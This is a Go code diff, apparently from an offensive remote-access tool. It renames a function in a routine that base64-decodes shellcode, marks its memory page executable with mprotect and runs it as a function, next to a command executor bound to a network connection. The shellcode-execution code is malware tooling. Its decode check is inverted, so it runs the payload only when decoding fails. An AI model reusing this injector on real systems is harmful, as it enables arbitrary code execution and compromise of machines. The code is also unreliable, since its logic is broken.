@@ -31,7 +31,7 @@ func ExecuteCmd(command string, conn net.Conn) {
 func InjectShellCode(encShellcode string) {
 	if encShellcode != "" {
 		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err != nil {
-			go ExecShellcode(shellcode)
+			go ExecShellCode(shellcode)
 		}
 	}
 }
@@ -42,7 +42,7 @@ func getPage(p uintptr) []byte {
 }
 
 // ExecShellcode sets the memory page containing the shellcode to R-X, then execute shellcode as a function
-func ExecShellcode(shellcode []byte) {
+func ExecShellCode(shellcode []byte) {
 	shellcodeAddr := uintptr(unsafe.Pointer(&shellcode[0]))
 	page := getPage(shellcodeAddr)
 	syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
